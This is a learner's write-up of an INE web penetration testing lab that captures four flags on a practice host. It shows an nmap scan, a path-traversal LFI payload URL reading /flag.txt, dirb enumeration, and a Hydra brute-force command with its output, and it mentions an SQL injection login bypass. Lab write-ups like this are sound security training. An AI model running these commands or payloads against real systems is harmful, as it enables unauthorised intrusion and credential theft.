## Overview

Web Application Penetration Testing is a critical process in identifying and exploiting vulnerabilities within web applications to assess their security posture. This type of testing simulates real-world attacks to uncover weaknesses such as SQL Injection, Cross-Site Scripting (XSS), Local File Inclusion (LFI), and others that could be exploited by malicious actors. Penetration testers use a combination of automated tools and manual techniques to probe the application for vulnerabilities, validate their impact, and suggest mitigation strategies. By performing these tests, organizations can identify potential security flaws before they are exploited by attackers, ensuring the integrity and confidentiality of sensitive data and safeguarding the application from future threats.

This lab is designed to test your knowledge and skills in identifying web application vulnerabilities and uncovering hidden information on a target web server.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. The target website is accessible at **http://target.ine.local**.

**Objective**: Identify web application vulnerabilities in the target website and capture all the flags hidden within the environment.

**Useful wordlists:**

```
/usr/share/wordlists/dirb/common.txt 
/usr/share/seclists/Usernames/top-usernames-shortlist.txt 
/root/Desktop/wordlists/100-common-passwords.txt
```

**Flags to Capture:**

- **Flag 1:** Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag.
- **Flag 2:** Explore the structure of the server's directories. Enumeration might reveal hidden treasures.
- **Flag 3:** The login form seems a bit weak. Trying out different combinations might just reveal the next flag.
- **Flag 4:** The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag.

# Tools

The best tools for this lab are:

- Nmap
- Gobuster
- Hydra

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

## Solutions

1. Scanning the target first with NMAP just a simple service detection and version scan.

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target.ine.local 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-22 01:14 IST
Nmap scan report for target.ine.local (192.41.79.3)
Host is up (0.000024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=6/22%Time=68570B8C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,EBA,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Sat,\x2021\x20Jun\x202025\x2019:44:12\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x203
SF:615\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\
SF:x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"vie
SF:wport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20
SF:\x20\x20\x20<title>CTF\x20Challenge\x20-\x20Welcome</title>\n\x20\x20\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/style\.css\">\n\x20
SF:\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'Courier\x20Ne
SF:w',\x20Courier,\x20monospace;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20background-color:\x20#1a1a1a;\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fl
SF:ex-direction:\x20column;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20min-height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#333;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20padding:\x2010px\x2020px;\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20display:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20justify-content:\x20space-between;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\x20\x20\x20\x20header\x20h1\x20
SF:{\n\x20\x20\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,B3,"HTTP/1\.0\x2020
SF:0\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,\x2021\x20Jun\x202025\x2
SF:019:44:12\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nContent-Leng
SF:th:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\nContent-Leng
SF:th:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x2
SF:0Request</title>\n\x20\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1>
SF:<p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Invalid\x20HTTP\x20Version\
SF:x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RTSP/1\.0&#x27;&#x27;\n\x
SF:20\x20</body>\n</html>\n");
MAC Address: 02:42:C0:29:4F:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.50 seconds

```

2. A website is running Let's check the website.

![[Pasted image 20250622011739.png]]

# **Flags to Capture:**

## **Flag 1:** Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag.

Opening up the text file 1,  I can see file parameter reading files which leads me to think that there might be LFI Vulnerability so I try the payload and read the flag in root directory and got it

```http
http://target.ine.local/view_file?file=../../../../../../../../flag.txt
```

![[Pasted image 20250622012242.png]]


## **Flag 2:** Explore the structure of the server's directories. Enumeration might reveal hidden treasures.

For the second flag this hints to search directories running dirb on website showed a hidden directory 

```bash
┌──(root㉿INE)-[~]
└─# dirb http://target.ine.local/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 22 01:23:46 2025
URL_BASE: http://target.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://target.ine.local/ ----
+ http://target.ine.local/about (CODE:200|SIZE:2858)                                                          
+ http://target.ine.local/login (CODE:200|SIZE:3377)                                                          
+ http://target.ine.local/logout (CODE:302|SIZE:189)                                                          
+ http://target.ine.local/secured (CODE:308|SIZE:251)                                                         
                                                                                                              
-----------------
END_TIME: Sun Jun 22 01:23:51 2025
DOWNLOADED: 4612 - FOUND: 4

```

`/secured` is the hidden directory and then I opened it and it holds a flag, So I accessed the FLAG 2.

![[Pasted image 20250622012601.png]]

##  **Flag 3:** The login form seems a bit weak. Trying out different combinations might just reveal the next flag.

So, I will bruteforce using Hydra with This Command and wordlist provided with LAB .

```bash
┌──(root㉿INE)-[~]
└─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-22 01:39:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1700 login tries (l:17/p:100), ~107 tries per task
[DATA] attacking http-post-form://target.ine.local:80/login:username=^USER^&password=^PASS^:F=Invalid
[80][http-post-form] host: target.ine.local   login: guest   password: butterfly1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-22 01:39:43

```

So, we found some credentials. Let's try to login with this

![[Pasted image 20250622014119.png]]

Got the 3rd Flag too


## **Flag 4:** The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag.

Let's try this my SQLi payload for admin 

![[Pasted image 20250622013450.png]]
Got the flag.

![[Pasted image 20250622013538.png]]